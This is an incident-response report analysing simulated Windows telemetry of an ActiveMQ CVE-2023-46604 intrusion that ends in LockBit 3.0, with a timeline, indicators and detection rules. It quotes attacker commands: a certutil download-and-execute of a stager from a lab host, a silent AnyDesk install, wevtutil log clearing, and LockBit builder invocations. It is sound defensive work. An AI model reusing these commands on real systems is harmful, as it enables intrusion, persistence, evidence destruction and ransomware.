# Incident Report: Apache ActiveMQ Exploitation to LockBit 3.0 Ransomware

**Case ID:** ir-activemq-lockbit-2026-04-24
**Analyst:** IR portfolio project
**Date of analysis:** 2026-08-24
**Scope of this report:** a lab reconstruction of a documented public intrusion,
analyzed from a real dataset of captured Windows telemetry. This is stated once,
plainly, here: **detection and investigation below are demonstrated live against
real captured event data. Containment, eradication, and recovery are described in
conditional voice as what would be done, and are explicitly not demonstrated
against a live environment**, because no live environment exists to contain. See
"What this cannot claim" at the end for the full boundary.

## Key takeaways

- Initial access was CVE-2023-46604, the Apache ActiveMQ OpenWire protocol
  deserialization remote code execution vulnerability, exploited against a
  self-installed ActiveMQ 5.18.1 instance. The exploit spawned `cmd.exe` directly
  from `java.exe`, with no intervening browser, script host, or Office process.
- The attacker downloaded and ran a Meterpreter-style stager via `certutil
  -urlcache`, established command and control to a Metasploit-handler-style
  listener on port 4444, then installed AnyDesk silently as a Windows service for
  persistent remote access.
- Before enabling RDP, the attacker cleared the System, Application, and Security
  Windows Event Logs within about 50 milliseconds of each other, an anti-forensic
  action.
- The attacker ran the leaked LockBit 3.0 builder toolkit (`keygen.exe`,
  `builder.exe`) directly on the compromised host from `C:\Intel\`, compiling
  several ransomware payload variants and a matching decryptor, then executed two
  of them (`LB3_pass.exe`, `LB3.exe`).
- The ransomware dropped ransom note files (`<ID>.README.txt`) into every
  directory under the ActiveMQ installation within about 90 milliseconds of
  execution. This dataset does not contain evidence of the bulk file-encryption
  pass itself; see "What this cannot claim."
- 6 new Sigma-derived detections were written and scored against this data; all 6
  fire on real attacker activity. Of the 6 pre-existing detections from a sibling
  project (`splunk-detection-lab`), only 1 of 6 is a true positive against this
  intrusion when run unmodified; 1 more technically fires but on unrelated benign
  activity; 4 do not fire, for three distinct honest reasons documented below.
- No evidence of credential dumping (LSASS access) or lateral movement to a second
  host was found in this dataset, contradicting two assumptions carried in from
  prior research about this intrusion. Both are documented as real gaps, not
  inferred as having happened off-camera.

## Case summary

On 2026-04-24, a publicly reachable Apache ActiveMQ 5.18.1 instance running on
host `EC2AMAZ-I41BETP` (installed under
`C:\Users\Administrator\Downloads\apache-activemq-5.18.1-bin\`) was exploited via
CVE-2023-46604. The exploit caused the ActiveMQ Java process to spawn a Windows
command shell, from which the attacker downloaded and ran a Meterpreter stager,
installed AnyDesk for persistent remote access, cleared event logs, enabled RDP,
ran discovery commands, and finally deployed a self-built LockBit 3.0 ransomware
payload. The observed window of clearly attacker-driven activity runs from
09:20:01 UTC (the RCE) to 09:32:15 UTC (ransom notes dropped), about 12 minutes,
with a further LockBit builder-toolkit run at 09:30:08-09 UTC inside that window.
Legitimate administrative and simulation-environment activity (software
installs, an EC2 Systems Manager agent, an initial RDP session by the box's own
operator) surrounds this window on both sides in the captured telemetry and is
excluded from the attacker timeline below.

This reconstruction is Splunk's own Apache-2.0-licensed simulated reproduction
(`attack_data` repository, `apt_simulations/ActiveMQ_exploit_Lockbit_Ransomware`)
of the intrusion documented by The DFIR Report at
<https://thedfirreport.com/2026/02/23/apache-activemq-exploit-leads-to-lockbit-ransomware/>.
Where this reconstruction agrees or disagrees with that published report is
called out explicitly in "Where this differs from the published report," below.
The chain here was derived independently from the raw event data first; the
published report was read afterward only to compare, per the task's requirement
not to copy a published narrative and present it as independent analysis.

## Framework note: NIST SP 800-61 Revision 3

This report is organized against the **CSF 2.0 Functions** (Govern, Identify,
Protect, Detect, Respond, Recover) that NIST SP 800-61 Revision 3 (Final, April
2025) uses as its structure, not the older four-phase lifecycle (Preparation;
Detection and Analysis; Containment, Eradication and Recovery; Post-Incident
Activity) from Revision 2. Revision 3 replaced that structure; it is not an
optional update. Where the old phase names are used below for readability
(discovery, persistence, and so on, which are ATT&CK tactic names, not NIST
phases), that is a different vocabulary and not a citation of the retired model.

## Attack chain (attacker-behavior order, derived from the data)

All times UTC, from `_time` after timestamp verification (see
`evidence/02a_timestamp_verification_sysmon.txt` and
`evidence/02b_timestamp_verification_security_powershell.txt`). Host
`EC2AMAZ-I41BETP` throughout; a second host, `EC2AMAZ-TLJH2O4`, is also present
in this dataset but shows no attacker-driven activity (see "Two hosts, not one,"
below).

### Initial Access: CVE-2023-46604 (Apache ActiveMQ OpenWire RCE)

At 09:20:01.341Z, `java.exe` (PID 6172, running
`"...\java.exe" ... -jar ...\bin/activemq.jar start`, current directory
`C:\Users\Administrator\Downloads\apache-activemq-5.18.1-bin\apache-activemq-5.18.1\`)
spawned `cmd.exe` running:

```
cmd.exe /c "certutil -urlcache -f http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ %TEMP%\qSwUwejx.exe & start /B %TEMP%\qSwUwejx.exe"
```

`10.0.2.13` is an internal address inside the attack_range lab subnet, not a
real-world attacker IP; it is reported here as it appears in the simulated
telemetry, not as an original IOC finding (see "Indicators," below, for the
distinction from the published report's real-world IOCs).

### Execution: stager download and run

At 09:20:01.930Z, `qSwUwejx.exe` (PID 5820) executed from `%TEMP%`. At
09:20:03.309Z it opened a TCP connection from `10.0.2.12:50834` to
`10.0.2.13:4444`, initiated (`Initiated=true`), the default listener port for a
Metasploit `multi/handler`. This is consistent with a Meterpreter stager
receiving its second stage over that connection.

At 09:25:31.107Z, a second `cmd.exe` (PID 3868) appeared with **no resolvable
Sysmon parent** (`ParentProcessGuid` all zeroes, `ParentImage=-`), running at
High integrity as `EC2AMAZ-I41BETP\Administrator`, current directory the
ActiveMQ install path. Its recorded `ParentProcessId` (5820) matches the
stager's PID exactly. A broken parent link like this, pointing at a process that
Sysmon otherwise tracked cleanly, is a known artifact of shell access obtained
through in-process code injection (as Meterpreter's `shell` command does) rather
than a normal `CreateProcess` call, and is the interactive shell the rest of the
intrusion runs from.

### Persistence: AnyDesk installed as a service

At 09:33:22.329Z, `anydesk.exe` ran:

```
anydesk.exe --install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent
```

One second later `AnyDesk.exe --service` started under `NT AUTHORITY\SYSTEM`
from `services.exe`, confirming a real Windows service registration, not just a
file drop. At 09:35:36.433Z the attacker ran `AnyDesk.exe --set-password
[REDACTED]`, then `AnyDesk.exe --get-id` twice (09:36:36Z and 09:43:33Z), the
second call almost 7 minutes after the first, consistent with the operator
reconnecting later to confirm the ID. `certutil -urlcache -split -f
https://download.anydesk.com/AnyDesk.exe` at 09:26:50Z shows the same file was
also fetched from AnyDesk's real CDN as a fallback or duplicate download attempt.

### Defense Evasion: event log clearing ahead of enabling RDP

At 09:56:43.322Z, `cmd.exe /c rdp.bat` (a batch script, not typed interactively)
ran `net stop termservice /yes`, then at 09:56:48.989Z `net start termservice`,
restarting the Remote Desktop service. Between those two calls, at
09:56:51.028Z, 09:56:51.055Z, and 09:56:51.075Z, three `wevtutil cl` calls
cleared the System, Application, and Security event logs respectively, all from
the same parent process, all within 47 milliseconds. Clearing all three
first-party logs immediately around a service bounce that enables remote access
is a clean anti-forensic signature.

### Discovery

Starting 10:02:51Z: `net user` / `net1 user` (local account enumeration),
`net group "Admins Domain" /domain` (10:03:11-27Z, domain admin group
enumeration, repeated with a truncated command line the second time,
`"Admins Domain/`, suggesting a typo or terminal issue on the attacker's side),
`net view` (10:03:44Z, network share/host enumeration), and `net session`
(10:26:04Z, active session enumeration). All ran as `NT AUTHORITY\SYSTEM` from
`cmd.exe`, not from a PowerShell parent.

### Impact: LockBit 3.0 builder toolkit and execution

At 10:30:08.788-08.975Z, six binaries in `C:\Intel\` ran in immediate
succession, all children of the same `cmd.exe` (PID 2572), all as
`NT AUTHORITY\SYSTEM`:

| Time (UTC) | Binary | Command |
|---|---|---|
| 10:30:08.788 | `keygen.exe` | `-path Build -pubkey pub.key -privkey priv.key` |
| 10:30:08.883 | `builder.exe` | `-type dec -privkey Build\priv.key -config config.json -ofile Build\LB3Decryptor.exe` |
| 10:30:08.908 | `builder.exe` | `-type enc -exe -pubkey Build\pub.key -config config.json -ofile Build\LB3.exe` |
| 10:30:08.923 | `builder.exe` | `-type enc -exe -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_pass.exe` |
| 10:30:08.942 | `builder.exe` | `-type enc -dll -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32.dll` |
| 10:30:08.957 | `builder.exe` | `-type enc -dll -pass -pubkey Build\pub.key -config config.json -ofile Build\LB3_Rundll32_pass.dll` |
| 10:30:08.975 | `builder.exe` | `-type enc -ref -pubkey Build\pub.key -config config.json -ofile Build\LB3_ReflectiveDll_DllMain.dll` |

This is `keygen.exe`/`builder.exe`, the two binaries of the publicly leaked
LockBit 3.0 builder, generating a fresh keypair and compiling six payload
variants (plain EXE, password-gated EXE, plain DLL, password-gated DLL, a
reflective DLL, and a decryptor) from a single `config.json`. Building the
payload on the victim host itself, rather than dropping a pre-built binary, is
notable: it means no static ransomware-binary hash existed anywhere before this
moment.

At 10:31:57.146Z, `LB3_pass.exe` executed from `explorer.exe` (an interactive
desktop session, consistent with the RDP access enabled earlier). At
10:32:10.162Z, `LB3.exe` executed the same way.

At 10:32:15.025-15.112Z, `LB3.exe` created ransom note files named
`7duXYi3SC.README.txt` (a random per-run ID, `7duXYi3SC`, followed by
`.README.txt`) in at least the following directories, all under the ActiveMQ
install path, within an 87-millisecond span:

```
...\apache-activemq-5.18.1\conf\
...\apache-activemq-5.18.1\bin\
...\apache-activemq-5.18.1\bin\win32\
...\apache-activemq-5.18.1\bin\win64\
...\apache-activemq-5.18.1\data\kahadb\
...\apache-activemq-5.18.1\data\tmp\jetty-...-api-...\
...\apache-activemq-5.18.1\data\tmp\jetty-...-api-...\jsp\
...\apache-activemq-5.18.1\data\tmp\jetty-...-admin-...\
...\apache-activemq-5.18.1\data\tmp\jetty-...-admin-...\jsp\
```

183 total `*.README.txt` creation events were recorded (see
`evidence/07_detection_scoring.txt`). This dataset does not show file rename or
content-modification events carrying the LockBit-style encrypted-file extension,
so the bulk file-encryption pass itself, as opposed to the ransom-note drop, is
not directly observable here (see "What this cannot claim").

## Two hosts, not one: a correction to the prior research assumption

Prior research for this project (`wshearer-site/research/ir-case-study.md`)
stated this dataset covers "one host." Querying the ingested data directly shows
that is not accurate: `Computer` carries six distinct values across the three
log sources (`EC2AMAZ-I41BETP`, `EC2AMAZ-I41BETP.attackrange.local`,
`EC2AMAZ-TLJH2O4`, `EC2AMAZ-TLJH2O4.attackrange.local`, `WIN-GM4EB5GIVO0`,
`WIN-QQ6SF2TB3S8`; see `evidence/` search output captured during analysis,
reproducible with `| stats count by Computer`). `EC2AMAZ-I41BETP` (short and
FQDN forms of the same host) is where ActiveMQ is installed and where every
attacker-driven event in this report occurred. `EC2AMAZ-TLJH2O4` carries a
similar volume of telemetry but shows no LockBit builder activity, no ransom
notes, and its only RDP-type (LogonType 10) logon anywhere in the dataset
occurred at 07:29:56 UTC, before the 09:20:01Z exploit, consistent with the lab
operator's own setup session rather than attacker lateral movement. The two
`WIN-*` hosts contribute 85 near-identical Security events each (service
startup, time-change, crypto self-test events), reading as short-lived
boot/build-scaffolding noise from the attack_range provisioning process, not
attacker or victim activity. This report's attack chain is scoped entirely to
`EC2AMAZ-I41BETP`, because that is where the evidence actually is.

## Where this differs from the published report

The published DFIR Report (read for structure and context, not as a data
source; see licence note in the project README) documents LSASS credential
access, network discovery, and lateral movement via dumped credentials as part
of this intrusion. This reconstruction's dataset does not support any of the
three:

- **No LSASS access observed.** Sysmon EventID 10 (ProcessAccess), the event
  type that would record a process opening a handle to `lsass.exe`, does not
  occur anywhere in this capture (0 of 13,462 Sysmon events; confirmed by full
  EventID distribution, `evidence/03_sysmon_eventid_distribution.txt`). Whatever
  Sysmon configuration generated this simulated capture evidently did not enable
  ProcessAccess auditing. This is a telemetry gap in the dataset, not evidence
  that credential access did not happen.
- **No lateral movement observed.** No LockBit builder or payload activity, no
  ransom notes, and no attacker-pattern RDP logons were found on the second host
  (`EC2AMAZ-TLJH2O4`) or either `WIN-*` host.

This reconstruction agrees with the published report on the initial access
vector (CVE-2023-46604), the Meterpreter-style C2 stager, the AnyDesk
persistence mechanism, and the use of the LockBit 3.0 builder toolkit to compile
the ransomware locally, all independently re-derived here from raw process,
file, and network events before comparison.

## Detections written, and what they caught

Six Sigma rules were written from the confirmed evidence above, converted to
real SPL with `sigma-cli` 3.1.0 / `pySigma` 1.5.0 / `pysigma-backend-splunk`
2.1.0 (`splunk_windows` pipeline; raw conversion output in
`evidence/06_sigma_conversion_raw_output.txt`), then run against the live
index. All six fire on real recorded activity:

| Rule | Stage | Hits | Notes |
|---|---|---|---|
| `d1_activemq_java_spawns_shell` | Initial Access | 1 | The exact RCE shell spawn, no other match in the dataset. |
| `d2_certutil_download_and_execute` | Execution / C2 | 3 | 1 malicious (the stager) + 2 benign (Git installer, AnyDesk's real CDN); a real cross-contamination case, not filtered out. |
| `d3_anydesk_silent_install` | Persistence | 1 | The silent, unattended-install flag combination. |
| `d4_wevtutil_clear_logs` | Defense Evasion | 3 | All three `wevtutil cl` calls. |
| `d5_lockbit_builder_toolkit` | Impact (pre-execution) | 6 | All six `keygen.exe`/`builder.exe` invocations. |
| `d6_ransom_note_dropped` | Impact | 183 | Every `*.README.txt` creation; intentionally broad, needs a burst/frequency threshold in production (see rule notes). |

### Stages this dataset could not detect

- **Credential access (LSASS).** No detection is possible because the
  underlying EventID 10 telemetry was never collected in this capture, as noted
  above. A detection targeting this stage cannot be validated against this
  dataset at all, positively or negatively.
- **Lateral movement.** No lateral movement occurred in this dataset (see
  above), so there is nothing to detect and no rule was written for it here.
- **Bulk file encryption.** The ransom-note drop is directly observable; the
  actual mass file-rename/encryption pass is not, because no Sysmon FileCreate
  or file-rename events carrying an encrypted-file extension were found. A
  production detection for "mass file modification with a new extension in a
  short window" could be written, but it cannot be validated as a true
  positive against this specific dataset, so it was not included among the six
  above.

## Did the existing splunk-detection-lab detections fire?

The 6 detections at
`splunk-detection-lab/evidence/detection_dev/*.spl` were run against this data
exactly as they are stored, with only the index name changed
(`detection_lab` to `ir_activemq_lockbit`), because the task was specifically
"would these, as they exist today, have fired here," not "could a corrected
version of these fire here." Full detail and the exact commands are in
`evidence/08_existing_detections_cross_check.txt`.

| Detection | Fires? | Real result |
|---|---|---|
| D1 registry Run key | 1 hit | **False positive.** The one match is a benign Java updater writing its own autorun key 37 minutes before the intrusion begins, not attacker persistence. This intrusion's real persistence mechanism was an AnyDesk Windows service, a different technique than D1 targets. |
| D2 schtasks + encoded PowerShell | 0 hits | Correct miss: this intrusion did not use scheduled-task persistence. |
| D3 net localgroup admins | 0 hits | Real miss: the attacker ran `net group "Admins Domain" /domain` (domain group enumeration), not `net localgroup administrators` (local admin enumeration); the rule's exact substring does not cover the variant used. |
| D4 net user enumeration | 2 hits | **True positive.** `net user` and `net1 user` at the attacker's discovery stage. The one clean hit among the six. |
| D5 process access to AUDIODG | 0 hits | Structural: EventID 10 does not exist in this capture at all (see above), so this detection could not have fired regardless of attacker behavior. |
| D6 PowerShell spawns recon tool | 0 hits | Real miss: the attacker's discovery commands ran from `cmd.exe`, not a `powershell.exe` parent; same behavior, different shell lineage than the rule requires. |

Net result: **1 true positive out of 6**, run unmodified against a real
different intrusion than the one they were built and scored against. That is
a genuine, useful data point about how narrowly-scoped, technique-specific
detections generalize (or do not) across different incidents, not a defect in
either project.

One further, separate finding surfaced during this cross-check: the D1 rule as
written (`TargetObject="*\\Run\\*"`, doubled backslash) returns only 1 hit
against this dataset's raw-XML-extracted field values, while the same pattern
written with a single backslash (`TargetObject="*\Run\*"`) returns 46. The
doubled-backslash form was apparently tuned against `splunk-detection-lab`'s
JSON-sourced data, where field values carry escaped backslashes; against this
project's XML-sourced data, real field values contain single literal
backslashes, so the doubled pattern under-matches. This is reported, not
silently corrected, per the task's "run them against this data" instruction;
correcting it would answer a different question than the one asked.

## Timeline table

| Date/Time (UTC) | What happened | How we know |
|---|---|---|
| 2026-04-24 09:20:01.341 | ActiveMQ's `java.exe` spawns `cmd.exe` running a `certutil -urlcache` download-and-execute command | Sysmon EventID 1, `ParentImage=java.exe`, `Image=cmd.exe` |
| 2026-04-24 09:20:01.930 | Stager `qSwUwejx.exe` executes from `%TEMP%` | Sysmon EventID 1, `ParentImage=cmd.exe` |
| 2026-04-24 09:20:03.309 | Stager connects outbound to `10.0.2.13:4444` | Sysmon EventID 3 (NetworkConnect), `Initiated=true` |
| 2026-04-24 09:25:31.107 | Interactive shell appears with a broken Sysmon parent link, High integrity | Sysmon EventID 1, `ParentProcessGuid` all zeroes |
| 2026-04-24 09:33:22.329 | AnyDesk silently installed as a Windows service | Sysmon EventID 1, `CommandLine` contains `--install ... --silent` |
| 2026-04-24 09:33:23.460 | AnyDesk service starts under `NT AUTHORITY\SYSTEM` | Sysmon EventID 1, `ParentImage=services.exe` |
| 2026-04-24 09:35:36.433 | AnyDesk unattended-access password set | Sysmon EventID 1, `CommandLine` contains `--set-password` |
| 2026-04-24 09:56:43.322 | `rdp.bat` stops Terminal Services | Sysmon EventID 1, `ParentCommandLine=cmd.exe /c rdp.bat` |
| 2026-04-24 09:56:48.989 | `rdp.bat` restarts Terminal Services | Sysmon EventID 1 |
| 2026-04-24 09:56:51.028-075 | System, Application, and Security event logs cleared | Sysmon EventID 1, `Image=wevtutil.exe`, `CommandLine` contains ` cl ` (x3) |
| 2026-04-24 10:02:51-10:26:04 | Local user, domain admin group, network view, and session discovery | Sysmon EventID 1, `Image IN (net.exe, net1.exe)` |
| 2026-04-24 10:30:08.788-975 | LockBit 3.0 builder toolkit compiles 6 payload/decryptor variants | Sysmon EventID 1, `Image IN (keygen.exe, builder.exe)` |
| 2026-04-24 10:31:57.146 | `LB3_pass.exe` executes | Sysmon EventID 1, `ParentImage=explorer.exe` |
| 2026-04-24 10:32:10.162 | `LB3.exe` executes | Sysmon EventID 1, `ParentImage=explorer.exe` |
| 2026-04-24 10:32:15.025-112 | Ransom notes dropped across 9+ directories | Sysmon EventID 11 (FileCreate), `TargetFilename` contains `.README.txt` |

## Indicators

Indicators observed directly in this dataset's own telemetry (not copied from
the published report, though they may coincide since both describe the same
underlying simulated intrusion):

- C2 destination: `10.0.2.13:4444` (attack_range internal lab subnet, not a
  real-world address).
- Stager download URL: `http://10.0.2.13:8080/2aXLOl2E_xIIBzjdZCjVVQ`.
- Stager filename: `qSwUwejx.exe` (randomized per build; not a stable IOC across
  different runs of the same attack_range scenario).
- Ransom note naming: `<8-character-ID>.README.txt`, observed ID `7duXYi3SC`
  (also randomized per build).
- Host: `EC2AMAZ-I41BETP` / `EC2AMAZ-I41BETP.attackrange.local`.

The published DFIR Report's own IOCs (e.g. `166.62.100[.]52`, real AnyDesk IDs,
real file hashes from the actual incident it documents) belong to that report
and are not reproduced here as this project's own findings; they describe a
different, real-world capture of the same attack pattern, not this simulated
dataset.

## What would be taken as Respond/Recover actions (not demonstrated)

The remainder of this section is written in conditional voice. Nothing below
was executed against a live system; there is no live system. This
reconstruction works from pre-captured log files with no host to isolate, no
network to segment, and no ticket to close. The published DFIR Report this
dataset is based on has no containment or remediation section either; stopping
at documentation, indicators, and detections is a normal, credible scope for
intrusion analysis in this field, not a shortcut taken here.

If this were a live environment, the response actions that the evidence above
would justify, in order, are:

1. **Isolate** `EC2AMAZ-I41BETP` from the network immediately on detecting the
   AnyDesk silent-install pattern (D3) or the LockBit builder toolkit execution
   (D5), whichever fires first, since both are unambiguous high-confidence
   signals with essentially no legitimate-admin-activity overlap.
2. **Revoke** the AnyDesk unattended-access credential and remove the AnyDesk
   service, since it is confirmed attacker-installed persistence, not a
   pre-existing legitimate tool.
3. **Patch** the ActiveMQ instance to a version beyond 5.18.1 or apply the
   CVE-2023-46604 vendor fix, and reassess why an internet-facing message
   broker was reachable and un-patched in the first place (a Govern/Protect gap,
   not just a technical one).
4. **Rebuild** the host from a known-good image rather than attempting in-place
   remediation, given SYSTEM-level compromise, log tampering, and a
   locally-built ransomware execution all occurred on it.
5. **Rotate** any credentials that were exposed to a SYSTEM-level shell on this
   host, and review domain admin group membership given the attacker's
   `net group "Admins Domain" /domain` enumeration, even though no evidence of
   actual privilege escalation into that group was found.
6. **Restore** from backups taken before 2026-04-24 09:20:01 UTC, verified
   clean, only after the host is rebuilt and the ActiveMQ vulnerability is
   closed.

No recovery time objective, downtime figure, or business-impact dollar amount
is stated anywhere in this report. Any such number would be fabricated for a
lab dataset with no real business behind it, which is exactly the kind of
overclaim this project's constraints rule out.

## Lessons learned (CSF 2.0 Identify: Improvement, ID.IM)

Per NIST SP 800-61 Rev 3, lessons learned are a continuous activity under
Identify's Improvement category, not a closing phase gated behind recovery. The
lessons that follow from this specific intrusion:

- An internet-facing service running unpatched, vulnerable software (ActiveMQ
  5.18.1, vulnerable to CVE-2023-46604) is a Govern/Protect failure that made
  every later stage possible. Asset inventory and patch cadence for
  internet-facing services is the highest-leverage fix here, ahead of any
  detection engineering.
- This capture's Sysmon configuration did not enable ProcessAccess (EventID 10)
  auditing. That is a Protect/Detect gap independent of this specific
  intrusion: it silently removes the ability to detect LSASS credential
  dumping, one of the most consequential single techniques in a ransomware
  chain, regardless of what other logging is in place.
- Detections tuned narrowly to one captured technique (as the 6
  `splunk-detection-lab` rules were, against different OTRF captures) do not
  reliably generalize to a different real intrusion even when the broad
  technique category is the same (process/registry/network discovery). Only 1
  of 6 held up unmodified. Detection coverage claims should specify what they
  were validated against, not just what ATT&CK technique they nominally target.

## What this cannot claim

- **No live containment, eradication, or recovery was performed or is claimed.**
  Section "What would be taken as Respond/Recover actions" is entirely
  conditional.
- **No recovery time objective or downtime figure is claimed**, fabricated or
  otherwise; none exists for a lab dataset.
- **The IOCs listed are this dataset's own simulated values**, not independent
  real-world discoveries; the published DFIR Report's real IOCs belong to that
  report and are cited by URL, not reproduced as original findings here.
- **Credential access (LSASS) cannot be confirmed or ruled out** from this
  dataset; the required telemetry (Sysmon EventID 10) was never collected in
  this capture. Its absence here is a telemetry gap, not evidence it did not
  happen in the real intrusion this dataset is based on.
- **Lateral movement did not occur in this dataset**, as far as the ingested
  telemetry shows; a second host (`EC2AMAZ-TLJH2O4`) is present in the data but
  carries no attacker-pattern activity.
- **Bulk file encryption is not directly observable**; only the ransom-note
  drop is. Whether or how many files were actually encrypted cannot be stated
  from this telemetry.
- **This report does not claim NIST 800-61's retired four-phase lifecycle**;
  it is organized against the CSF 2.0 Functions per Revision 3 (Final, April
  2025), stated explicitly above.
- **One PowerShell-Operational event (1 of 43,105 in the raw source file) is
  missing from the index** after ingest, for a reason that direct
  investigation (duplicate-content check, malformed-event check, length-limit
  check, timestamp-collision check) did not resolve within the time budgeted
  for it. This is reported as an unresolved, small (0.002%), real discrepancy,
  not glossed over as a clean parse. See `evidence/01_counts_by_source.txt`
  and the corresponding test in `tests/test_ingest.py`.
